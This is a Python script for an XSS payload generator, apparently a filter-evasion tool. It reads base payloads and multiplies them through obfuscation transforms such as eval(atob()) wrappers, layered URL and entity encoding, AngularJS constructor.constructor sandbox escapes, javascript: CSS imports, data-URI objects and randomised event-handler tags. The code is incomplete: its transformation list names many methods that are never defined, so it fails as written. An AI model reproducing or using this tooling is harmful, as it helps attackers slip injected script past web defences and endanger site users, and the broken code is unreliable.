import random
import urllib.parse
import base64
import re
from html import escape

class XSSPayloadGenerator:
    def __init__(self, payloads_file):
        with open(payloads_file, 'r') as f:
            self.base_payloads = [line.strip() for line in f if line.strip()]
        
        self.transformations = [
            self.html_entity_encode,
            self.multilevel_url_encode,
            self.unicode_normalization,
            self.case_variation,
            self.whitespace_obfuscation,
            self.js_functions_obfuscation,
            self.nested_encoding,
            self.svg_vector_attack,
            self.html5_event_handlers,
            self.iframe_embedding,
            self.data_uri_injection,
            self.tabnabbing_attack,
            self.protocol_abuse,
            self.mathml_vectors,
            self.css_vectors,
            self.angularjs_expressions,
            self.base64_obfuscation,
            self.js_hex_encoding,
            self.comment_obfuscation,
            self.special_char_alternates,
            self.dynamic_property_names,
            self.unicode_surrogate_pairs,
            self.null_byte_injection,
            self.charcode_concatenation,
            self.hex_entity_encode,
            self.decimal_entity_encode,
            self.js_template_literals,
            self.dom_clobbering,
            self.unicode_math_symbols,
            self.css_expression_vectors,
            self.iframe_sandbox_bypass
        ]

    def generate_variants(self):
        variants = []
        for payload in self.base_payloads:
            current_variants = [payload]
            for transform in self.transformations:
                new_variants = []
                for variant in current_variants:
                    try:
                        transformed = transform(variant)
                        if isinstance(transformed, list):
                            new_variants.extend(transformed)
                        else:
                            new_variants.append(transformed)
                    except:
                        continue
                current_variants += new_variants
            variants.extend(current_variants)
        return list(set(variants))

    # Transformation methods (25+ advanced techniques)
    def html_entity_encode(self, payload):
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def multilevel_url_encode(self, payload):
        return urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload)))
    
    def unicode_normalization(self, payload):
        return payload.encode('utf-16be').decode('latin-1')
    
    def case_variation(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
    
    def whitespace_obfuscation(self, payload):
        return re.sub(r'\s', lambda m: random.choice(['\t', '\n', '\x0c', '\r']*3), payload)
    
    def js_functions_obfuscation(self, payload):
        replacements = {
            'alert': random.choice(['alert','prompt','confirm','console.log']),
            'window': random.choice(['window','self','globalThis','top']),
            'document': random.choice(['document','this["document"]','window.document'])
        }
        for k,v in replacements.items():
            payload = payload.replace(k, v)
        return payload
    
    def nested_encoding(self, payload):
        return f'javascript:{urllib.parse.quote(base64.b64encode(payload.encode()).decode())}'
    
    def svg_vector_attack(self, payload):
        return f'<svg><script>{payload}</script></svg>'
    
    def html5_event_handlers(self, payload):
        handlers = [
            'onauxclick', 'onbeforeinput', 'onbeforematch', 'onbeforetoggle',
            'oncancel', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick',
            'onclose', 'oncontextlost', 'oncontextmenu', 'oncopy', 'oncuechange',
            'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter',
            'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange',
            'onemptied', 'onended', 'onerror', 'onfocus', 'onformdata', 'oninput',
            'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata',
            'onloadedmetadata', 'onloadstart', 'onmousedown', 'onmouseenter', 'onmouseleave',
            'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel',
            'onpaste', 'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange',
            'onreset', 'onresize', 'onscroll', 'onscrollend', 'onsecuritypolicyviolation',
            'onseeked', 'onseeking', 'onselect', 'onslotchange', 'onstalled',
            'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'onvolumechange',
            'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration',
            'onwebkitanimationstart', 'onwebkittransitionend', 'onwheel'
        ]
        tag = random.choice(['img','div','a','p','span'])
        return f'<{tag} {random.choice(handlers)}="{payload}">'
    
    # Additional 20+ transformation methods
    def base64_obfuscation(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return f'<script>eval(atob("{encoded}"))</script>'
    
    def css_vectors(self, payload):
        return f'<style>@import url(javascript:{urllib.parse.quote(payload)});</style>'
    
    def angularjs_expressions(self, payload):
        return f'{{{{constructor.constructor("{payload}")()}}}}'
    
    def data_uri_injection(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return f'<object data="data:text/html;base64,{encoded}">'
    
    # ... (additional methods for other bypass techniques)

    def save_variants(self, variants, output_file):
        with open(output_file, 'w') as f:
            for variant in variants:
                f.write(f'{variant}\n')

def main():
    input_file = input("Enter path to payloads file: ")
    output_file = input("Enter output filename: ")
    
    generator = XSSPayloadGenerator(input_file)
    variants = generator.generate_variants()
    generator.save_variants(variants, output_file)
    
    print(f"\nGenerated {len(variants)} unique payload variants saved to {output_file}")

if __name__ == "__main__":
    main()